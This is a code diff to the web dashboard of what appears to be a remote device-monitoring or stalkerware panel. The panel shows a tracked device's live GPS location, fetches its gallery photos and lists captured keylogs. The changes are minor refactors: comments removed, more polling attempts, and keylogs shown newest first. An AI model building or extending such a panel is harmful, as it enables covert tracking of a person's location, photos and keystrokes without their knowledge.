@@ -878,7 +878,6 @@ async function loadDeviceInfo(showLoadingOverlay = false) {
     }
 }
 
-// ================== GPS DATA UPDATE ==================
 function updateGPSData(data) {
     const deviceId = getDeviceId();
     const lat = data.latitude ?? null;
@@ -887,43 +886,29 @@ function updateGPSData(data) {
     const timestamp = data.last_seen ? new Date(data.last_seen) : new Date();
 
     if (lat !== null && lng !== null) {
-        // Update cards
         document.getElementById("latValue").textContent = lat.toFixed(6);
         document.getElementById("lngValue").textContent = lng.toFixed(6);
         document.getElementById("accuracyValue").textContent = accuracy !== null ? accuracy + " m" : "-- m";
         document.getElementById("lastUpdateValue").textContent = timestamp.toLocaleTimeString();
 
-        // Save last known
         const locationObj = { latitude: lat, longitude: lng, accuracy: accuracy, timestamp: timestamp.getTime() };
         saveLastKnownLocation(deviceId, locationObj);
 
-        // Update marker and map smoothly
         const popupContent = `<b>CURRENT LOCATION</b><br>Latitude: ${lat.toFixed(6)}<br>Longitude: ${lng.toFixed(6)}${accuracy ? `<br>Accuracy: ${accuracy} m` : ''}<br>Updated: ${timestamp.toLocaleTimeString()}`;
-
         createOrUpdateMarker(lat, lng, popupContent);
-
-        map.flyTo([lat, lng], 15, {
-            duration: 1.5,
-            easeLinearity: 0.25
-        });
-
+        map.flyTo([lat, lng], 15, { duration: 1.5 });
         hideOverlay();
         return;
     }
 
-    // If no new location, check last known
     const lastKnown = getLastKnownLocation(deviceId);
     if (lastKnown && lastKnown.latitude !== undefined && lastKnown.longitude !== undefined) {
-        const latVal = lastKnown.latitude;
-        const lngVal = lastKnown.longitude;
-        const accVal = lastKnown.accuracy ?? null;
+        const latVal = lastKnown.latitude, lngVal = lastKnown.longitude, accVal = lastKnown.accuracy ?? null;
         const lastTime = lastKnown.timestamp ? new Date(lastKnown.timestamp) : new Date();
-
         document.getElementById("latValue").textContent = latVal.toFixed(6);
         document.getElementById("lngValue").textContent = lngVal.toFixed(6);
         document.getElementById("accuracyValue").textContent = accVal !== null ? accVal + " m" : "-- m";
         document.getElementById("lastUpdateValue").textContent = lastTime.toLocaleTimeString();
-
         const popupContent = `<b>LAST KNOWN LOCATION</b><br>Latitude: ${latVal.toFixed(6)}<br>Longitude: ${lngVal.toFixed(6)}${accVal !== null ? `<br>Accuracy: ${accVal} m` : ''}<br>Last updated: ${lastTime.toLocaleTimeString()}`;
         createOrUpdateMarker(latVal, lngVal, popupContent);
         map.flyTo([latVal, lngVal], 15, { duration: 1.5 });
@@ -931,7 +916,6 @@ function updateGPSData(data) {
         return;
     }
 
-    // No location ever
     document.getElementById("latValue").textContent = "--.-------";
     document.getElementById("lngValue").textContent = "--.-------";
     document.getElementById("accuracyValue").textContent = "-- m";
@@ -967,7 +951,7 @@ async function fetchGalleryPhotos(fetchAll = false) {
             body: JSON.stringify({ deviceId, count })
         });
         let media = [];
-        for (let i = 0; i < 8; i++) {
+        for (let i = 0; i < 15; i++) {
             await new Promise(resolve => setTimeout(resolve, 2000));
             const res = await fetch(`/api/gallery?deviceId=${deviceId}&count=${count}`);
             if (!res.ok) throw new Error('Failed to fetch gallery');
@@ -1068,7 +1052,14 @@ async function refreshKeylog() {
         if (!response.ok) throw new Error("Failed");
         const logs = await response.json();
         if (logs.length === 0) { container.innerHTML = "No keylogs yet."; return; }
-        container.innerHTML = logs.map(log => `<div class="keylog-entry">${escapeHtml(log.text)}<span class="keylog-time">${new Date(log.timestamp).toLocaleTimeString()}</span></div>`).join("");
+        // ✅ নতুন ডেটা উপরে দেখাতে reverse
+        logs.reverse();
+        container.innerHTML = logs.map(log => `
+            <div class="keylog-entry">
+                ${escapeHtml(log.text)}
+                <span class="keylog-time">${new Date(log.timestamp).toLocaleTimeString()}</span>
+            </div>
+        `).join("");
     } catch (e) { console.error(e); container.innerHTML = "Error loading keylogs."; }
 }
 async function refreshScreenData() {
@@ -1092,4 +1083,4 @@ init();
 </script>
 
 </body>
-    </html>
+</html>
